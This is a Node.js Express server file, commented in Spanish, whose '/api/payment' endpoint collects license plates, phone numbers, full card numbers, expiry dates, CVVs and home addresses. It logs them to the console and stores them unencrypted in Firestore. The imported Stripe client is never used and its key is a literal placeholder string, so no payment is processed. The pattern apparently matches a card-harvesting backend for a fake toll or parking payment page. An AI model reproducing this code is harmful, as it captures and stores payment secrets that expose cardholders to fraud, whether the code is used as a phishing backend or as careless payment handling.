const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const admin = require('firebase-admin');
const serviceAccount = require('./serviceAccountKey.json');

const stripe = require("stripe")("process.env.STRIPE_SECRET_KEY");

// Inicializa Firebase Admin con credenciales
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const db = admin.firestore();
const app = express();
const port = 3000;

// Sirve archivos estáticos (tu frontend en /public)
app.use(express.static('public'));

// Middleware para permitir CORS y parsear JSON
app.use(cors());
app.use(bodyParser.json());

// Content Security Policy (ajusta si usas scripts inline)
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'");
  next();
});

// Ruta para recibir datos del pago
app.post('/api/payment', async (req, res) => {
  try {
    const {
      licensePlate,
      mobileNumber,
      cardNumber,
      expirationDate,
      cvv,
      name,
      streetAddress,
      apartment,
      city,
      state,
      zipCode
    } = req.body;

    // Validación de campos requeridos
    if (
      !licensePlate || !mobileNumber || !cardNumber || !expirationDate ||
      !cvv || !name || !streetAddress || !city || !state || !zipCode
    ) {
      return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Verifica si ya existe un usuario con misma placa o tarjeta
  /*const duplicateQuery = await db.collection('payments')
      .where('licensePlate', '==', licensePlate)
      .where('mobileNumber', '==', mobileNumber)
      .get();

    if (!duplicateQuery.empty) {
      return res.status(409).json({ error: 'Usuario ya registrado con estos datos' });
    }*/

    // Mostrar en consola
    console.log('✅ Datos recibidos del cliente:');
    console.log({
      licensePlate,
      mobileNumber,
      cardNumber,
      expirationDate,
      cvv,
      name,
      streetAddress,
      apartment,
      city,
      state,
      zipCode
    });

    // Crear objeto y guardar en Firestore
    const paymentData = {
      licensePlate,
      mobileNumber,
      cardNumber,
      expirationDate,
      cvv,
      name,
      streetAddress,
      apartment,
      city,
      state,
      zipCode,
      timestamp: admin.firestore.FieldValue.serverTimestamp()
    };

    const docRef = await db.collection('payments').add(paymentData);

    res.status(200).json({ message: 'Pago registrado con éxito', id: docRef.id });

  } catch (error) {
    console.error('❌ Error al procesar el pago:', error);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

// Inicia el servidor
app.listen(port, () => {
  console.log(`🚀 Servidor escuchando en http://localhost:${port}`);
});